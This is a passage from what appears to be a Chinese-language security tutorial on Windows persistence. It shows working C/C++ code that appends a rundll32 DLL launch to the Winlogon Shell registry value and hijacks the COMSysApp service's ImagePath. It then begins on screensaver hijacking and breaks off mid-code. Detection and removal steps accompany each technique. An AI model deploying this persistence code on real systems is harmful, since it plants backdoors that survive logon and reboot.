Winlogon\Notify - 指向处理Winlogon事件的通知包DLL
Winlogon\Userinit - 指向userinit.exe，即用户登录时执行的用户初始化程序
Winlogon\Shell - 指向explorer.exe，即用户登录时执行的系统shell
攻击者可以利用这些功能重复执行恶意代码建立持久后门，如下的代码演示了如何通过在Winlogon\Shell子键添加恶意程序路径实现驻留系统的目的。
    BOOL add_winlogon_helper()
    {
        BOOL ret = FALSE;
        LONG rcode = NULL;
        DWORD key_value_type;
        BYTE shell_value_buffer[MAX_PATH * 2]; 
        DWORD value_buffer_size = sizeof(shell_value_buffer) ;
        HKEY winlogon_key = NULL; 
        DWORD set_value_size;
        BYTE path[MAX_PATH]; 
        rcode = RegOpenKeyEx(HKEY_CURRENT_USER, _TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),
                NULL, KEY_ALL_ACCESS, &winlogon_key);
        if (rcode != ERROR_SUCCESS)
        {
            goto ERROR_EXIT;
        }
        //
        rcode = RegQueryValueEx(winlogon_key,_TEXT("shell"), NULL, &key_value_type, shell_value_buffer, &value_buffer_size);
        if (rcode != ERROR_SUCCESS)
        {
            //找不到指定的键值
            if (rcode == 0x2)   
            {
                //写入explorer.exe 和 自定义的路径
                lstrcpy((TCHAR*)path, _TEXT("explorer.exe, rundll32.exe \"C:\\topsec.dll\" RunProc"));
                set_value_size = lstrlen((TCHAR*)path) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(winlogon_key, _TEXT("shell"), NULL, REG_SZ, path, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
            }
            else
            {
                goto ERROR_EXIT;
            }
        }
        else
        {
            //原先已存在，追加写入
            lstrcat((TCHAR*)shell_value_buffer, _TEXT(",rundll32.exe \"C:\\topsec.dll\" RunProc"));
            set_value_size = lstrlen((TCHAR*)shell_value_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
            rcode = RegSetValueEx(winlogon_key, _TEXT("shell"), NULL, REG_SZ, shell_value_buffer, set_value_size);
            if (rcode != ERROR_SUCCESS)
            {
                goto ERROR_EXIT;
            }
        }
        ret = TRUE;
    ERROR_EXIT:
        if (winlogon_key != NULL)
        {
            RegCloseKey(winlogon_key);
            winlogon_key = NULL;
        }
        return ret;
    }
其中topsec.dll 的导出函数RunProc 代码如下：
    extern "C" __declspec(dllexport) void  RunProc(HWND hwnd,HINSTANCE hinst, LPTSTR lpCmdLine,int nCmdShow)
    {
        while (TRUE)
        {
            OutputDebugString(_TEXT("Hello Topsec with Rundll32!!!"));
            Sleep(1000);
        }
    }
## **运行效果图**
当该用户下次登录的时候Winlogon会带动Rundll32程序，通过命令行参数加载预设的DLL文件执行其导出函数，如下图所示，目标稳定运行中：
![
](https://images.seebug.org/content/images/2019/08/b65e25f3-4a80-4c2b-92c0-1e71c8482f95.png-w331s)
运行后的注册表键值情况如下图所示：
![
](https://images.seebug.org/content/images/2019/08/5d6e3a8f-cbfa-45aa-85b1-e63486c7ddc8.png-w331s)
## **检查及清除方法**
检查以下2个注册表路径中的“Shell”、“Userinit”、“Notify”等键值是否存在不明来历的程序路径
1） HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\
2） HKCU\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\
关键键值如下图所示：
1）Winlogon\Notify – 默认指向处理Winlogon事件的通知包DLL
2）Winlogon\Userinit – 默认指向userinit.exe，即用户登录时执行的用户初始化程序
3）Winlogon\Shell – 默认指向explorer.exe，即用户登录时执行的系统shell
# **篡改服务进程**
## **原理及代码介绍**
Windows服务的配置信息存储在注册表中，一个服务项有许多键值，想要修改现有服务，就要了解服务中的键值代表的功能。
“DisplayName”，字符串值，对应服务名称；
“Description”，字符串值，对应服务描述；
“ImagePath”，字符串值，对应该服务程序所在的路径；
“ObjectName”，字符串值，值为“LocalSystem”，表示本地登录；
“ErrorControl”，DWORD值，值为“1”；
“Start”，DWORD值，值为2表示自动运行，值为3表示手动运行，值为4表示禁止；
“Type”，DWORD值，应用程序对应10，其他对应20。
在这里，我们只需要注意“ImagePath”，“Start”，“Type”三个键值，“ImagePath”修改为自己的程序路径，“Start”改为2，自动运行，“Type”改为10应用程序。
接下来就要选择一个服务，在这里，我们选择的服务是“COMSysApp”，本身“Type”为10。
修改键值的代码如下：
        HKEY hKey;
        DWORD dwDisposition;
        DWORD dwData = 2;
        const char system[] = "C:\\SeviceTopSec.exe";//hello.exe
        if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\services\\COMSysApp", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
        {
            return 0;
        }
        if (ERROR_SUCCESS != RegSetValueExA(hKey, "ImagePath", 0, REG_EXPAND_SZ, (BYTE*)system, (1 + ::lstrlenA(system))))
        {
            return 0;
        }
        if (ERROR_SUCCESS != RegSetValueExA(hKey, "Start", 0, REG_DWORD, (BYTE*)& dwData, sizeof(DWORD)))
        {
            return 0;
        }
        return 0;
但是“ImagePath”中的程序并不是普通的程序，需要用到一些特定的API，完成服务的创建流程。
总的来说，一个遵守服务控制管理程序接口要求的程序包含下面三个函数：
服务程序主函数（main）：调用系统函数 StartServiceCtrlDispatcher 连接程序主线程到服务控制管理程序。
服务入口点函数（ServiceMain）：执行服务初始化任务，同时执行多个服务的服务进程有多个服务入口函数。
控制服务处理程序函数（Handler）：在服务程序收到控制请求时由控制分发线程引用。
服务程序代码如下：
    HANDLE hServiceThread;
    void KillService();
    char* strServiceName = "sev_topsec"; 
    SERVICE_STATUS_HANDLE nServiceStatusHandle; 
    HANDLE killServiceEvent;
    BOOL nServiceRunning;
    DWORD nServiceCurrentStatus;
    void main(int argc, char* argv[])
    {
        SERVICE_TABLE_ENTRYA ServiceTable[] =
        {
        {strServiceName,(LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
        {NULL,NULL}
        };
        BOOL success;
        success = StartServiceCtrlDispatcherA(ServiceTable);
        if (!success)
        {
            printf("fialed!");
        }
    }
    void ServiceMain(DWORD argc, LPTSTR* argv)
    {
        BOOL success;
        nServiceStatusHandle = RegisterServiceCtrlHandlerA(strServiceName,
            (LPHANDLER_FUNCTION)ServiceCtrlHandler);
        success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 1, 3000);
        killServiceEvent = CreateEvent(0, TRUE, FALSE, 0);
        if (killServiceEvent == NULL)
        {
            return;
        }
        success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 2, 1000);
        success = InitThread();
        nServiceCurrentStatus = SERVICE_RUNNING;
        success = ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0, 0, 0);
        WaitForSingleObject(killServiceEvent, INFINITE);
        CloseHandle(killServiceEvent);
    }
    BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode,DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint,DWORD dwWaitHint)
    {
        BOOL success;
        SERVICE_STATUS nServiceStatus; 
        nServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
        nServiceStatus.dwCurrentState = dwCurrentState;
        //
        if (dwCurrentState == SERVICE_START_PENDING)
        {
            nServiceStatus.dwControlsAccepted = 0;
        }
        else
        {
            nServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP 
                | SERVICE_ACCEPT_SHUTDOWN;
        }
        if (dwServiceSpecificExitCode == 0)
        {
            nServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
        }
        else
        {
            nServiceStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
        }
        nServiceStatus.dwServiceSpecificExitCode = dwServiceSpecificExitCode;
        //
        nServiceStatus.dwCheckPoint = dwCheckPoint;
        nServiceStatus.dwWaitHint = dwWaitHint;
        success = SetServiceStatus(nServiceStatusHandle, &nServiceStatus);
        if (!success)
        {
            KillService();
            return success;
        }
        else
            return success;
    }
    BOOL InitThread()
    {
        DWORD id;
        hServiceThread = CreateThread(0, 0,
            (LPTHREAD_START_ROUTINE)OutputString,
            0, 0, &id);
        if (hServiceThread == 0)
        {
            return false;
        }
        else
        {
            nServiceRunning = true;
            return true;
        }
    }
    DWORD OutputString(LPDWORD param)
    {
        OutputDebugString(L"Hello TopSec\n");
        return 0;
    }
    void KillService()
    {
        nServiceRunning = false;
        SetEvent(killServiceEvent);
        ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0, 0, 0);
    }
    void ServiceCtrlHandler(DWORD dwControlCode)
    {
        BOOL success;
        switch (dwControlCode)
        {
        case SERVICE_CONTROL_SHUTDOWN:
        case SERVICE_CONTROL_STOP:
            nServiceCurrentStatus = SERVICE_STOP_PENDING;
            success = ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0, 1, 3000);
            KillService();
            return;
        default:
            break;
        }
        ReportStatusToSCMgr(nServiceCurrentStatus, NO_ERROR, 0, 0, 0);
    }
## **运行效果图**
先修改注册表中的键值
![
](https://images.seebug.org/content/images/2019/08/6a9c0340-20a4-4b13-8775-eb9c343746db.png-w331s)
重启“COMSysApp“服务
![
](https://images.seebug.org/content/images/2019/08/159fc9d4-5f1a-43bd-8709-5e469173355a.png-w331s)
发现在DebugView中打印出字符串。
在任务管理器中点击转到进程，发现我们自己写的服务程序正在运行
![
](https://images.seebug.org/content/images/2019/08/8f930768-f877-4aef-a6dc-2dd1c175c920.png-w331s)
## **检查及清除方法**
  1. 检查注册表中与已知程序无关的注册表项的更改
  2. 检查已知服务的异常进程调用树。
# **替换屏幕保护程序**
## **原理及代码介绍**
屏幕保护是为了保护显示器而设计的一种专门的程序。当时设计的初衷是为了防止电脑因无人操作而使显示器长时间显示同一个画面，导致老化而缩短显示器寿命。用户在一定时间内不活动鼠标键盘之后会执行屏幕保护程序，屏保程序为具有.scr文件扩展名的可执行文件（PE）。
攻击者可以通过将屏幕保护程序设置为在用户鼠标键盘不活动的一定时间段之后运行恶意软件，也就是利用屏幕保护程序设置来维持后门的持久性。
屏幕保护程序的配置信息存储在在注册表中，路径为HKCU\Control Panel\Desktop，我们也可以通过改写关键键值来实现后门持久：
SCRNSAVE.EXE - 设置为恶意PE路径
ScreenSaveActive - 设置为“1”以启用屏幕保护程序
ScreenSaverIsSecure - 设置为“0”，不需要密码即可解锁
ScreenSaverTimeout - 指定在屏幕保护程序启动之前系统保持空闲的时间。
更具体的信息，可以查看微软对相关注册表项的说明页面， [点击此处](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc978622\(v=technet.10\))。
如下的代码演示了如何通过屏保程序来实现后门持久化：
    BOOL add_to_screensaver()
    {
        BOOL ret = FALSE;
        LONG rcode = NULL;